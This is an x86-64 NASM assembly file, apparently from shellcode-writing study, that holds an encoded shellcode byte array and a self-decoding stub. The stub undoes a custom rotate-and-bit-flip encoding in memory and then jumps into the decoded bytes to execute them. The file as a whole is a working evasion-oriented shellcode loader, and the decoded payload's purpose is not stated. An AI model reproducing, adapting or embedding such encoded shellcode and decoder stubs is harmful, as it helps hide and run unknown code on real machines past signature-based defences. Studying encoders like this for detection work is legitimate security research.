;Author: Eduardo
;Filename: flipRotation_decoder.nasm
;
;

global _start

section .text
_start:

	jmp decoder
	EncodedShellcode: db 0x49,0xff,0x18,0x02,0x7,0xff,0x8a,0xff,0x94,0xff,0xd5,0x02,0xb8,0x02,0xb1,0xff,0x68,0x02,0xde,0xff,0x8b,0x02,0xc5,0x02,0x27,0x02,0x2d,0xff,0x49,0x02,0xa4,0xff,0x88,0x02,0x73,0x02,0x45,0xff,0x4a,0xff,0x88,0x02,0x7c,0xff,0x59,0x02,0xa4,0xff,0x88,0x02,0xcf,0xff,0x25,0xff,0x50,0x02,0x1c,0xff,0xd1,0x02,0x38,0x02,0x8,0x02,0xa0,0xa0 ; 0xa0 is the stop marker

decoder:

	lea rsi, [rel EncodedShellcode]
	lea rdi, [rsi+1]	; pointing to second byte (0x02) from shellcode
	xor rax, rax
	mul rax					; zeroes edx
	mov al,	1 
	xor rcx, rcx
	xor rbx, rbx
	

decode:
	mov bl, byte [rsi + rax]	; mov parity byte to bl
	xor bl, 0xa0				; check if reached the end marker | 0xa0 ^ 0xff = 0x5f
	jz short EncodedShellcode	; reached the marker if Zero Flag not set

	xor bl, 0x5f	; if equal parity is even (0xff)
	mov bl, byte [rsi + rdx] 
	jnz odd

even:	; rotate right

	ror bl, cl
	jmp short bitFlip

odd: 	; rotate left

	rol bl, cl

bitFlip:

	xor bl, 0x01

restore_next_byte:

	mov byte [rsi + rdx], bl	; replaces the original byte
	mov bl, byte [rsi + rax+1] ; mov next shellbyte
	mov byte [rdi], bl
	inc rdi
	add al, 2
	inc dl
	inc cl ; = 0x2b  F - 00101011

	; Doing circular array as modulo workaround. Use 0x08 as a divisor or circular boundary because we are rotating 8 bits (al register). 

	cmp cl, 0x08	; if equal ZF will be set meaning we have a complete rotation
	jnz decode	; $+2 ; jump if rotation is not complete
	xor rcx, rcx	; if rotation is complete and reset cl to start again the "circular array"

	jmp short decode

